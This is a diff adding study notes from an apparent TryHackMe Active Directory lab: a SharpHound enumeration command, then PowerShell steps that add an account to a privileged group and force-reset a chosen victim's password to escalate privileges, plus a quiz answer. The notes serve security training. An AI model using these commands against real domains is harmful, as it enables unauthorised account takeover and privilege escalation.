@@ -259,3 +259,30 @@ What command can be used to execute Sharphound.exe and request that it recovers 
 only from the za.tryhackme.com domain without touching domain controllers?
 
     SharpHound.exe --CollectionMethods Sessions --Domain za.tryhackme.com --ExcludeDCs
+
+
+####################
+AD Exploit 
+##################
+AddMember:
+    Powershell:
+        Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
+
+    verify that the command worked by using the Get-ADGroupMember cmdlet:
+       Get-ADGroupMember -Identity "Groupe Name"
+
+If we can:
+    ForceChangePassword:
+        Get-ADGroupMember -Identity "Tier 2 Admins" : Identify a Victim
+
+    Use the Set-ADAccountPassword AD-RSAT cmdlet to force change the password:
+            $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
+            Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 
+
+***
+Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. 
+This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. 
+You could also run gpupdate /force and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
+
+
+Which ACE would allow you to update any non-protected parameter of a target object: GenericWrite
